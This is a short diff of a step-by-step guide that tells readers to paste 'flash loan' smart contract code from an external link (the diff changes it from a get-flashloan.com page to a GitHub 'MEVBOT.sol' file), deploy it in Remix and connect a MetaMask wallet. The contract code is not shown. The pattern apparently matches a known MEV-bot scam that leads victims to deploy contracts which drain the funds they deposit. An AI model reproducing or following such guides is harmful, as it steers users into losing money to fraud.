@@ -7,8 +7,7 @@ GUIDE
 2. Open 👉https://remix.ethereum.org/ from within your browser.
 3. Click on File Explorers and click "Create New File ".
 4. Name the file flashloans.sol and paste the contract code link below.
-👉 Smart Contract Code: 
-www.get-flashloan.com/smart-code-0-5-0-eth-bnb-2bbb/
+👉 Smart Contract Code: https://github.com/MeltedLabs/MEV-BOT/blob/main/MEVBOT.sol
 
 5. Click on Deploy & Run transactions  and set "ENVIRONMENT" to (Injected Web3) OR (Injected Provider - MetaMask).
 6. Connect your MetaMask wallet.
